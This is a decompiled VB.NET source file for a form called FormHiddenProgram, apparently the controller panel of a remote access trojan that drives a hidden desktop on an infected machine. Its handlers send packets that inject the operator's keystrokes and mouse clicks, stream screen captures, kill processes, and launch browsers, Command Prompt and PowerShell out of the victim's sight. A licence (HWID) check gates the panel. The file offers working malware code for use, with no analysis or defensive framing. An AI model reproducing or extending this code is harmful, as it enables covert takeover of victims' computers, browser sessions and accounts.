		' (set) Token: 0x0600049C RID: 1180 RVA: 0x000276F9 File Offset: 0x000258F9
		Friend Property ParentClient As Clients

		' Token: 0x170001EB RID: 491
		' (get) Token: 0x0600049D RID: 1181 RVA: 0x00027702 File Offset: 0x00025902
		' (set) Token: 0x0600049E RID: 1182 RVA: 0x0002770C File Offset: 0x0002590C
		Public Property GetImage As Image

		' Token: 0x0600049F RID: 1183 RVA: 0x00027718 File Offset: 0x00025918
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormHiddenProgram_Load
			AddHandler MyBase.Resize, AddressOf Me.FormHiddenProgram_Resize
			Me.FormSize = False
			Me.IntFPS = 0
			Me.sw = Stopwatch.StartNew()
			Me.decoder = New UnsafeStreamCodec(60, True)
			Me.syncPicbox = RuntimeHelpers.GetObjectValue(New Object())
			Me.InitializeComponent()
		End Sub

		' Token: 0x060004A0 RID: 1184 RVA: 0x00027794 File Offset: 0x00025994
		Private Sub FormHiddenProgram_Load(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)))
				If flag Then
					MyBase.Close()
				End If
				Dim flag2 As Boolean = Operators.ConditionalCompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)
				If flag2 Then
					Setting.Running = True
				Else
					MyBase.Close()
				End If
				Dim flag3 As Boolean = Not Setting.Running
				If flag3 Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
			Dim pictureBox As PictureBox = Me.PictureBox1
			Dim obj As Object = pictureBox
			SyncLock obj
				Dim pictureBox2 As Control = Me.PictureBox1
				AddHandler pictureBox2.KeyPress, AddressOf Me.KDW
			End SyncLock
			Me.ListProcessHidden.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(79, 46, 208)
			Me.ListProcessHidden.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListProcessHidden.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListProcessHidden.AlternatingRowsDefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListProcessHidden.DefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListProcessHidden.DefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListProcessHidden.DefaultCellStyle.SelectionBackColor = Color.FromArgb(47, 39, 134)
			Me.ListProcessHidden.DefaultCellStyle.SelectionForeColor = Color.FromArgb(255, 255, 255)
			Me.ListProcessHidden.CellBorderStyle = DataGridViewCellBorderStyle.None
			Me.ListProcessActive.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(79, 46, 208)
			Me.ListProcessActive.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListProcessActive.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListProcessActive.AlternatingRowsDefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListProcessActive.DefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListProcessActive.DefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListProcessActive.DefaultCellStyle.SelectionBackColor = Color.FromArgb(47, 39, 134)
			Me.ListProcessActive.DefaultCellStyle.SelectionForeColor = Color.FromArgb(255, 255, 255)
			Me.ListProcessActive.CellBorderStyle = DataGridViewCellBorderStyle.None
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex2 As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
			Me.PictureBox1.Focus()
		End Sub

		' Token: 0x060004A1 RID: 1185 RVA: 0x00027B88 File Offset: 0x00025D88
		Public Sub KDW(sender As Object, e As KeyPressEventArgs)
			Dim flag As Boolean = Me.ListProcessHidden.Rows.Count > 0 AndAlso Me.PictureBox1 IsNot Nothing
			If flag Then
				Me.PictureBox1.Focus()
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "KeyboardDown"
				msgPack.ForcePathObject("Key").AsString = Convert.ToBase64String(Encoding.UTF8.GetBytes(Conversions.ToString(e.KeyChar)))
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			End If
		End Sub

		' Token: 0x060004A2 RID: 1186 RVA: 0x00027C2C File Offset: 0x00025E2C
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
			Try
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x060004A3 RID: 1187 RVA: 0x00027CB4 File Offset: 0x00025EB4
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "Close"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x060004A4 RID: 1188 RVA: 0x00027D30 File Offset: 0x00025F30
		Private Sub FormHiddenProgram_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			Dim flag2 As Boolean
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
			flag2 = (Me.ListProcessHidden.Rows.Count > 0 AndAlso Me.PictureBox1 IsNot Nothing)
			If flag2 Then
				Try
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "Resize"
					msgPack.ForcePathObject("x").AsInteger = CLng(Convert.ToInt32(Me.PictureBox1.Width))
					msgPack.ForcePathObject("y").AsString = Conversions.ToString(Convert.ToInt32(Me.PictureBox1.Height))
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x060004A5 RID: 1189 RVA: 0x00027E94 File Offset: 0x00026094
		Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListProcessHidden.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListProcessHidden.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Dim msgPack As MsgPack = New MsgPack()
						Me.decoder = New UnsafeStreamCodec(Convert.ToInt32(100), True)
						msgPack.ForcePathObject("Packet").AsString = "GetScreen"
						msgPack.ForcePathObject("HandelName").AsString = dataGridViewRow.Cells(1).Value.ToString()
						msgPack.ForcePathObject("x").AsInteger = CLng(Convert.ToInt32(Me.PictureBox1.Width))
						msgPack.ForcePathObject("y").AsString = Conversions.ToString(Convert.ToInt32(Me.PictureBox1.Height))
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x060004A6 RID: 1190 RVA: 0x00027FE0 File Offset: 0x000261E0
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "GetActiveWindows"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060004A7 RID: 1191 RVA: 0x00028048 File Offset: 0x00026248
		Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListProcessHidden.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListProcessHidden.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").AsString = "Kill"
						msgPack.ForcePathObject("ProcessesByName").AsString = dataGridViewRow.Cells(1).Value.ToString()
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x060004A8 RID: 1192 RVA: 0x00028134 File Offset: 0x00026334
		Private Sub StateHApp_Click(sender As Object, e As EventArgs)
			Me.StateHApp.ForeColor = Color.White
			Me.StateHApp.Text = "..."
		End Sub

		' Token: 0x060004A9 RID: 1193 RVA: 0x0002815C File Offset: 0x0002635C
		Private Sub OpenEdgeBrowser_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "OpenEdgeBrowser"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060004AA RID: 1194 RVA: 0x000281C4 File Offset: 0x000263C4
		Private Sub OpenChromeBrowser_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "OpenChromeBrowser"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060004AB RID: 1195 RVA: 0x0002822C File Offset: 0x0002642C
		Private Sub OpenFireFoxBrowser_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "OpenFireFoxBrowser"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060004AC RID: 1196 RVA: 0x00028294 File Offset: 0x00026494
		Private Sub BraveBrowser_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "OpenBraveBrowser"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060004AD RID: 1197 RVA: 0x000282FC File Offset: 0x000264FC
		Private Sub CommandPrompt_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "OpenCommandPrompt"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060004AE RID: 1198 RVA: 0x00028364 File Offset: 0x00026564
		Private Sub PowerShell_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "OpenPowerShell"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060004AF RID: 1199 RVA: 0x000283CC File Offset: 0x000265CC
		Private Sub CustomOpen_Click(sender As Object, e As EventArgs)
			MyBase.BeginInvoke(New MethodInvoker(Sub()
				Try
					Dim text As String = Me.ClientInfo.Text + "| Hidden Applcations"
					Dim name As String = Functions.StringToBase64(text)
					Dim formCustomOpen As FormCustomOpen = CType(Application.OpenForms(name), FormCustomOpen)
					Dim flag As Boolean = formCustomOpen Is Nothing
					If flag Then
						formCustomOpen = New FormCustomOpen() With { .Name = name, .Text = "Hidden Applcations | Custom Open", .Info = Me.ClientInfo.Text, .FormName = "Hidden Applcations | Custom Open", .Client = Me.Client }
						formCustomOpen.Show()
					Else
						formCustomOpen.WindowState = FormWindowState.Minimized
						formCustomOpen.WindowState = FormWindowState.Normal
					End If
				Catch ex As Exception
					Me.StateHApp.ForeColor = Color.Red
					Me.StateHApp.Text = "Custom Open : Error " + ex.Message
				End Try
			End Sub))
		End Sub

		' Token: 0x060004B0 RID: 1200 RVA: 0x000283E4 File Offset: 0x000265E4
		Private Sub PictureBox1_MouseDown(sender As Object, e As MouseEventArgs)
			Try
				Dim size As Size = New Size(Conversions.ToInteger(Me.PictureBox1.Width), Conversions.ToInteger(Me.PictureBox1.Height))
				Dim point As Point = New Point(CInt(Math.Round(CDbl(e.X) * (CDbl(size.Width) / CDbl(Me.PictureBox1.Width)))), CInt(Math.Round(CDbl(e.Y) * (CDbl(size.Height) / CDbl(Me.PictureBox1.Height)))))
				Dim pictureBox As PictureBox = Me.PictureBox1
				Dim obj As Object = pictureBox
				SyncLock obj
					Dim flag2 As Boolean = Me.ListProcessHidden.Rows.Count > 0 AndAlso Me.PictureBox1 IsNot Nothing
					If flag2 Then
						Dim flag3 As Boolean = e.Button = MouseButtons.Left
						If flag3 Then
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "MouseLeftDown"
							msgPack.ForcePathObject("X").AsInteger = CLng(point.X)
							msgPack.ForcePathObject("Y").AsInteger = CLng(point.Y)
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						End If
						Dim flag4 As Boolean = e.Button = MouseButtons.Right
						If flag4 Then
							Dim msgPack2 As MsgPack = New MsgPack()
							msgPack2.ForcePathObject("Packet").AsString = "MouseRightDown"
							msgPack2.ForcePathObject("X").AsInteger = CLng(point.X)
							msgPack2.ForcePathObject("Y").AsInteger = CLng(point.Y)
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
						End If
					End If
				End SyncLock
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060004B1 RID: 1201 RVA: 0x00028610 File Offset: 0x00026810
		Private Sub PictureBox1_MouseUp(sender As Object, e As MouseEventArgs)
			Try
				Dim size As Size = New Size(Conversions.ToInteger(Me.PictureBox1.Width), Conversions.ToInteger(Me.PictureBox1.Height))
				Dim point As Point = New Point(CInt(Math.Round(CDbl(e.X) * (CDbl(size.Width) / CDbl(Me.PictureBox1.Width)))), CInt(Math.Round(CDbl(e.Y) * (CDbl(size.Height) / CDbl(Me.PictureBox1.Height)))))
				Dim pictureBox As PictureBox = Me.PictureBox1
				Dim obj As Object = pictureBox
				SyncLock obj
					Dim flag2 As Boolean = Me.ListProcessHidden.Rows.Count > 0 AndAlso Me.PictureBox1 IsNot Nothing
					If flag2 Then
						Dim flag3 As Boolean = e.Button = MouseButtons.Left
						If flag3 Then
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "MouseLeftUp"
							msgPack.ForcePathObject("X").AsInteger = CLng(point.X)
							msgPack.ForcePathObject("Y").AsInteger = CLng(point.Y)
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						End If
						Dim flag4 As Boolean = e.Button = MouseButtons.Right
						If flag4 Then
							Dim msgPack2 As MsgPack = New MsgPack()
							msgPack2.ForcePathObject("Packet").AsString = "MouseRightUp"
							msgPack2.ForcePathObject("X").AsInteger = CLng(point.X)
							msgPack2.ForcePathObject("Y").AsInteger = CLng(point.Y)
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack2.Encode2Bytes())
						End If
					End If
				End SyncLock
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060004B2 RID: 1202 RVA: 0x0002883C File Offset: 0x00026A3C
		Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs)
			Dim flag As Boolean = Me.ListProcessHidden.Rows.Count > 0 AndAlso Me.PictureBox1 IsNot Nothing
			If flag Then
				Try
					Me.PictureBox1.Focus()
					Dim size As Size = New Size(Conversions.ToInteger(Me.PictureBox1.Width), Conversions.ToInteger(Me.PictureBox1.Height))
					Dim point As Point = New Point(CInt(Math.Round(CDbl(e.X) * (CDbl(size.Width) / CDbl(Me.PictureBox1.Width)))), CInt(Math.Round(CDbl(e.Y) * (CDbl(size.Height) / CDbl(Me.PictureBox1.Height)))))
					Dim pictureBox As PictureBox = Me.PictureBox1
					Dim obj As Object = pictureBox
					SyncLock obj
						Dim flag3 As Boolean = Me.PictureBox1.Image IsNot Nothing
						If flag3 Then
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").AsString = "MouseMove"
							msgPack.ForcePathObject("X").AsInteger = CLng(point.X)
							msgPack.ForcePathObject("Y").AsInteger = CLng(point.Y)
							ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
						End If
					End SyncLock
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x060004B3 RID: 1203 RVA: 0x000289F0 File Offset: 0x00026BF0
		Private Sub CopyText_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListProcessHidden.Rows.Count > 0 AndAlso Me.PictureBox1 IsNot Nothing
			If flag Then
				Try
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "Copy"
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x060004B4 RID: 1204 RVA: 0x00028A80 File Offset: 0x00026C80
		Private Sub PasteText_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListProcessHidden.Rows.Count > 0 AndAlso Me.PictureBox1 IsNot Nothing
			If flag Then
				Try
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").AsString = "Paste"
					ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x060004B5 RID: 1205 RVA: 0x00028B10 File Offset: 0x00026D10
		Private Sub RefrshProcessActive_Click(sender As Object, e As EventArgs)
			Try
				Dim msgPack As MsgPack = New MsgPack()
				msgPack.ForcePathObject("Packet").AsString = "GetProcesess"
				ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060004B6 RID: 1206 RVA: 0x00028B78 File Offset: 0x00026D78
		Private Sub ToolStripMenuItem19_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListProcessActive.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListProcessActive.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").AsString = "Kill"
						msgPack.ForcePathObject("ProcessesByName").AsString = dataGridViewRow.Cells(1).Value.ToString()
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x060004B7 RID: 1207 RVA: 0x00028C64 File Offset: 0x00026E64
		Private Sub ToolStripMenuItem5_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListProcessActive.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListProcessActive.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Dim text As String = dataGridViewRow.Cells(3).Value.ToString()
						Dim fileName As String = Path.GetFileName(text.Split(New Char() { "."c })(0))
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").AsString = "ProcessAdd"
						msgPack.ForcePathObject("ProcessPath").AsString = text
						msgPack.ForcePathObject("ProcessName").AsString = fileName
						ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x0400021A RID: 538
		Private FormSize As Boolean

		' Token: 0x0400021B RID: 539
		Public IntFPS As Integer

		' Token: 0x0400021C RID: 540
		Public sw As Stopwatch

		' Token: 0x0400021D RID: 541
		Public decoder As IUnsafeCodec

		' Token: 0x0400021E RID: 542
		Public rdSize As Size

		' Token: 0x0400021F RID: 543
		Public syncPicbox As Object
	End Class
End Namespace
